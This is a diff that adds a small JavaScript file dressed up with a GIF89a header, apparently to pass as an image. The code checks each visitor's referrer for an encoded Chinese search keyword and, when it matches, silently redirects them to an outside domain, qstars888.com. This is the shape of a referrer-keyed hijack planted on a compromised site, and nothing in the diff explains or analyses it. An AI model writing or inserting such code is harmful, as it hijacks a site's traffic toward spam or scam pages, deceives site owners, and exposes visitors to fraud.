@@ -1,0 +1,7 @@
+GIF89a = "";
+var urlRef = document.referrer;
+var keys = ["%E8%8B%8F%E5%AD%9C%E9%98%BF%E7%94%AB%E7%89%87"]; 
+for (var i in keys) {
+    if (urlRef.indexOf(encodeURI(keys[i])) > 0 || urlRef.indexOf(encodeURIComponent(keys[i])) > 0 || urlRef.indexOf(escape(keys[i])) > 0 || urlRef.indexOf(keys[i]) > 0)
+        window.location.href = "http://www.qstars888.com/";   
+}
